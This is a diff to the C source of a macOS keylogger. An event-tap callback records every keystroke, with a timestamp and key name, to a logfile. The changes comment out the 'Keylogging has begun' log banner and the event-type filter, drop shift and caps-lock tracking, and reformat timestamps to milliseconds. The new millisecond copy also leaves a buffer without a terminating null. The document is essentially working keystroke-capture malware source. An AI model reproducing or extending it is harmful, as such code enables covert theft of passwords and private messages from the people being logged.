@@ -24,7 +24,6 @@ int main(int argc, const char *argv[]) {
     CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
     CGEventTapEnable(eventTap, true);
 
-
     // Clear the logfile if clear argument used or log to specific file if given.
     if (argc == 2) {
         if (strcmp(argv[1], "clear") == 0) {
@@ -47,7 +46,7 @@ int main(int argc, const char *argv[]) {
     }
 
     // Output to logfile.
-    fprintf(logfile, "\n\nKeylogging has begun.\n%s\n", asctime(localtime(&result)));
+    // fprintf(logfile, "\n\nKeylogging has begun.\n%s\n", asctime(localtime(&result)));
     fflush(logfile);
 
     // Display the location of the logfile and start the loop.
@@ -60,44 +59,41 @@ int main(int argc, const char *argv[]) {
 
 // The following callback method is invoked on every keypress.
 CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
-    if (type != kCGEventKeyDown && type != kCGEventFlagsChanged && type != kCGEventKeyUp) { return event; }
+
+    // if (type != kCGEventKeyDown && type != kCGEventFlagsChanged && type != kCGEventKeyUp) { return event; }
 
     // Retrieve the incoming keycode.
     CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
 
-    if (keyCode == leftShift || keyCode == rightShift || keyCode == capsLock) {
-        keyCodeCache[keyCode] = keyCodeCache[keyCode] == 1 ? 0 : 1;
-        // return event;
-    }
-
     struct timespec time;
     clock_gettime(CLOCK_REALTIME, &time);
-
-    printf("%lld.%.9ld", (long long)time.tv_sec, time.tv_nsec);
 
     time_t rawtime = time.tv_sec;
     struct tm  ts;
     char       timestamp[80];
-    char       milliseconds[80];
+    char       nanoseconds[80];
+    char       milliseconds[4];
 
     ts = *localtime(&rawtime);
     strftime(timestamp, sizeof(timestamp), "%Y-%m-%dT%H:%M:%S.", &ts);
+    sprintf(nanoseconds, "%.9ld", time.tv_nsec);
+    strncpy(milliseconds, &nanoseconds[0], 3);
 
     // Print the human readable key to the logfile.
     bool shift = keyCodeCache[rightShift] + keyCodeCache[leftShift] > 0;
     bool caps = keyCodeCache[capsLock] == 1;
-    fprintf(logfile, "{\"timestamp\": \"%s%.9ld\", \"key\": \"%s\", \"code\": \"%hu\", \"type\": \"%s\"}\n", timestamp, time.tv_nsec, convertKeyCode(keyCode, shift, caps), keyCode, convertType(type));
+    fprintf(logfile, "{\"timestamp\": \"%s%s\", \"key\": \"%s\", \"code\": \"%hu\", \"type\": \"%s\"}\n", timestamp, milliseconds, convertKeyCode(keyCode, shift, caps), keyCode, convertType(type));
     fflush(logfile);
     return event;
 }
 
 const char *convertType(CGEventType type) {
     switch ((CGEventType) type) {
-        case kCGEventKeyDown: return "down";
-        case kCGEventKeyUp: return "up";
-        case kCGEventFlagsChanged: return "changed";
+        case kCGEventKeyDown: return "[down]";
+        case kCGEventKeyUp: return "[up]";
+        case kCGEventFlagsChanged: return "[changed]";
     }
-    return "unknown";
+    return "[unknown]";
 }
 
 // The following method converts the key code returned by each keypress as
